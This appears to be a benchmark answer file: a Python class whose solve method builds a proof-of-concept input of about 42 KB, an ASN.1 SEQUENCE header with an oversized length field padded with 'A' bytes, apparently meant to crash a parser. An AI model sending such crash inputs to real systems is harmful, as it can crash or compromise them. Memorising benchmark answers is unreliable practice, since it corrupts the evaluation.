class Solution:
    def solve(self, src_path: str) -> bytes:
        L = 41798
        content_len = L - 1 - 3
        length_bytes = bytes([0x82, (content_len >> 8) & 0xFF, content_len & 0xFF])
        poc = b'\x30' + length_bytes + b'A' * content_len
        return poc